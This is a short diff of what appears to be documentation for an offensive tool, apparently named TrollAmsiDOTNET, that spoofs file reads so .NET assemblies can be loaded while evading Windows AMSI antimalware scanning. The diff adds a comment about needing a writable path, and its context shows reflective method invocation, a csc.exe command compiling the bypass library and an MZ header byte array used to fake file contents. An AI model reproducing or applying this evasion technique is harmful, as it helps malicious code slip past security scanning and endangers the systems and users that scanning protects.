@@ -26,6 +26,7 @@ $entryPoint.Invoke($null, (,$myargs))
 ```
 #This is a more generic library for Trollamsidotnet that works spoofs any files/path (not just assemblies) 
 #Any attempt to read from <path> will now read the $filebytes, so LoadFrom(<path>) works as well
+#<path\file> can already exist or not, but you must be able to write to that path, so desktop is good to start with
 
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /optimize /out:TrollAmsiDOTNET2.dll /target:library TrollAmsiDOTNET2.cs > $null
 $MZHeader = [byte[]](0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00)
